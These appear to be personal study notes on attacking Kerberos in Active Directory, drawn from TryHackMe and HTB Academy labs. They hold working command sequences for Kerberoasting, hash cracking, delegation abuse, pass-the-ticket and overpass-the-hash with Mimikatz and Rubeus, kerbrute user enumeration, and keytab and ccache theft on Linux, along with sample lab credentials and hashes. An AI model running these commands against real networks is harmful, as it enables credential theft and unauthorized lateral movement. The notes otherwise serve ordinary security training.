# Kerberos

> Made from my notes on tryhackme and Hackthebox Academy

## Kerberos authentication

The user makes an AS-REQ to the Key Distribution Centre (KDC) on the DC that includes a timestamp encrypted with the user's NTLM hash. Essentially, this is the request for a Ticket Granting Ticket (TGT). The DC checks the information and sends the TGT to the user. This TGT is signed with the KRBTGT account's password hash that is only stored on the DC. The user can now send this TGT to the DC to request a Ticket Granting Service (TGS) for the resource that the user wants to access. If the TGT checks out, the DC responds to the TGS that is encrypted with the NTLM hash of the service that the user is requesting access for. The user then presents this TGS to the service for access, which can verify the TGS since it knows its own hash and can grant the user access.  

![Kerberos auth](../.res/2022-08-01-13-54-27.png)  

> *Source: [TryHackMe - Persisting AD](https://tryhackme.com/room/persistingad)*

The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

- The TGT - Ticket Granting Ticket is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS.
- The TGS - Ticket Granting Service is requested by users who want to use a service. These tickets allow services to verify the user's identity.

> Source: HTB Academy

## Kerberoasting

- Any valid user gets a ticket with kerberos to access a service (SQL for instance)
- Tool: GetUsersSPNS.py - Impacket
- Get a hash using the tool
  
  ```bash
  ┌──(root💀kali)-[~kali]
  └─# GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 10.0.2.5 -request
  /usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

  ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet      LastLogon 
  --------------------------------------  ----------  -----------------------------------------------------------  -------------------  ---------
  HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2022-01-28 17:55:04  <never>   

  $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb60bb[STRIPPED]7e35f1a787901409e16bc
  ```

  - If we get this error `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` we need to coordinate our time with the server time using ntpdate
- `sudo apt install ntpdate`
     - `sudo ntpdate 10.10.10.100`

        ```bash
        5 Mar 19:42:53 ntpdate[19369]: step time server 10.10.10.100 offset +426.954203 sec
        ```
  - And then you should be able to rerun and actually get the hash

- Finding the proper module in hashcat `hashcat --help | grep Kerberos`
  ```
  ┌──(root💀kali)-[~/active-directory]
  └─# hashcat --help | grep Kerberos
     7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
    13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
    18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
    19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
    19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
    19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
    19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
  ```
- We need TGS which is 13100
- Crack the hash with hachcat (for it to work I needed to have 4gb on my vm)
  ```bash
  ┌──(root💀kali)-[~/active-directory]
  └─# hashcat -m 13100 hashkerb.txt /usr/share/wordlists/rockyou.txt -O filename
  ```bash
- Crack the hash with john
  - Alternatively we can use john
  ```bash
  john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerbhash.txt
  ```

- We get the password
  ```bash
  $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb6[STRIPPED]6bc:MYpassword123#
  ```
- After getting a password, we could connect to an smbshare or get a shell

  ```python
  python3 wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
  ```
  or
  ```bash
  smbclient \\\\10.10.10.100\\Users -U active.htb\\Administrator
  ```

## Exploiting Kerberos Delegation

The practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs to access a SQL database hosted on the database server for the web application that it is hosting. Without delegation, we would probably use an AD service account and provide it with direct access to the database. When requests are made on the web application, the service account would be used to authenticate to the database and recover information.

However, we can allow this service account to be delegated to the SQL server service. Once a user logs into our web application, the service account will request access to the database on behalf of that user. This means that the user would only be able to access data in the database that they have the relevant permissions for without having to provide any database privileges or permissions to the service account itself.

> *Source: [TryHackMe](https://tryhackme.com/room/exploitingad)*

### Example

- Enerumerate available delegations with a privileged user
  - `Import-Module C:\Tools\PowerView.ps1`
  - `Get-NetUser -TrustedToAuth`
- Dump LSASecrets with [Mimikatz](https://github.com/gentilkiwi/mimikatz/security)
  - `mimikatz.exe`
  - `token::elevate` To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
  - `lsadump::secrets` Mimikatz interacts with the registry hive to pull the clear text credentials.
  
![Dump](../.res/2022-07-29-13-06-16.png)  

- Perform the kerberos delegation attack with [kekeo](https://github.com/gentilkiwi/kekeo) `kekeo.exe`
- `tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted` generate a TGT that can be used to generate tickets for the HTTP and WSMAN services
  - user - The user who has the constrained delegation permissions.
  - domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
  - password - The password associated with the svcIIS account.

![generate TGT](../.res/2022-07-29-13-08-20.png)  

- `/user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc` forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession on THMSERVER1
  - tgt - We provide the TGT that we generated in the previous step.
  - user - The user we want to impersonate. Since t2 accounts have administrative access over workstations, it is a safe assumption that t1 accounts will have administrative access over servers, so choose a t1_ account that you would like to impersonate.
  - service - The services we want to impersonate using delegation. We first generate a TGS for the HTTP service. Then we can rerun the same command for the WSMAN service. `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`
- Import the tickets with Mimikatz

```dos
privilege::debug
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

- You should have a similar output  

![output](../.res/2022-07-29-15-35-02.png)

- You can run `klist` to check that the tickets were imported
- We just need to create our session in our target  

![Session](../.res/2022-07-29-15-37-15.png)

## Bruteforce users with kerbrute

- Get kerbrute [here](https://github.com/ropnop/kerbrute)
- If you do not have creds yet but see kerberos in the list of ports, it is worth trying to enumerate users with a wordlist using kerbrute
- `./kerbrute_linux_amd64 userenum -d timelapse.htb --dc 10.10.11.152 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`

> Note: There's a lot of other things you can do with kerberos

## Pass the Ticket from Windows

> Reminder: We need local admin rights.  
> To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:

- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

### Mimikatz - Exports Tickets

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.

> Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

### Rubeus - Export Tickets

```cmd
Rubeus.exe dump /nowrap
```

### Pass the Key or OverPass the Hash

The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation [Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). Also Will Schroeder adapted their project to create the [Rubeus](https://github.com/GhostPack/Rubeus) tool.

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys.

### Mimikatz - Extract Kerberos Keys

```cmd
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.

### Mimikatz - Pass the Key or OverPass the Hash

```cmd
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.

### Rubeus - Pass the Key or OverPass the Hash

```cmd
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

> Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

### Pass the ticket

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Another way is to import the ticket into the current session using the .kirbi file from the disk.

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

> Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.

### Pass The Ticket with PowerShell Remoting (Windows)

#### Mimikatz

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new cmd.exe and execute mimikatz.exe, then import the ticket we collected using kerberos::ptt. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command Enter-PSSession to connect to the target machine.

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
Enter-PSSession -ComputerName DC01
```

#### Rubeus

Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly. This prevents the erasure of existing TGTs for the current logon session.

```cmd
# Create a Sacrificial Process with Rubeus
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.

```cmd
# Pass the Ticket for Lateral Movement
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
powershell
Enter-PSSession -ComputerName DC01
```

## Pass the Ticket (PtT) from Linux

> Source: HTB Academy

Although not common, Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization's systems, giving users the ability to have a single identity to authenticate on Linux and Windows computers.

A Linux computer connected to Active Directory commonly uses Kerberos as authentication. Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.

A Linux system can be configured in various ways to store Kerberos tickets.

> Note: A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

### Kerberos on linux

Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the /tmp directory. By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

Another everyday use of Kerberos in Linux is with keytab files. A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.

Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.

> Note: Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

### Identifying Linux and Active Directory Integration

We can identify if the Linux machine is domain joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

- `realm list` Check If Linux Machine is Domain Joined

In case realm is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html).

- `ps -ef | grep -i "winbind\|sssd"` PS - Check if Linux Machine is Domain Joined

### Finding Kerberos Tickets in Linux

As an attacker, we are always looking for credentials. On Linux domain joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. 

### Finding Keytab Files

A straightforward approach is to use find to search for files whose name contains the word keytab. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to .keytab. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.

- `find / -name *keytab* -ls 2>/dev/null` Search for Files with Keytab in the Name

> Note: To use a keytab file, we must have read and write (rw) privileges on the file.

- `crontab -l` Identifying Keytab Files in Cronjobs

### Finding ccache Files

A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data.

- `env | grep -i krb5` Reviewing Environment Variables for ccache Files
- `ls -la /tmp` Searching for ccache Files in /tmp

### Abusing KeyTab Files

As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using kinit. To use a keytab file, we need to know which user it was created for. klist is another application used to interact with Kerberos on Linux. This application reads information from a keytab file.

- `klist -k -t` Listing keytab File Information

```bash
# Impersonating a User with a keytab
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist

# Connect to `\\dc01\carlos`
smbclient //dc01/carlos -k -c ls
```

> Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.

### Keytab Extract

The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

We can attempt to crack the account's password by extracting the hashes from the keytab file with [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)  

```bash
# Extracting Keytab Hashes with KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

> Note: A keytab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as [crackstation](https://crackstation.net/), which contains billions of passwords.

```bash
# Once we get the password we can log in as the user
su - carlos@inlanefreight.htb
klist
```

### Abusing Keytab ccache

#### COMING SOON

![Coming soon](../.res/coming-soon.png)  

## Resources

{% embed url="https://lisandre.com/archives/14538" %} Kerberos - port 88 by Lisandre {% endembed %}  
{% embed url="https://youtu.be/lJQn06QLwEw?si=RqHthyeIW8b0kS6x" %}  Abusing Microsoft Kerberos - Sorry you guys don't get it. {% endembed %}  
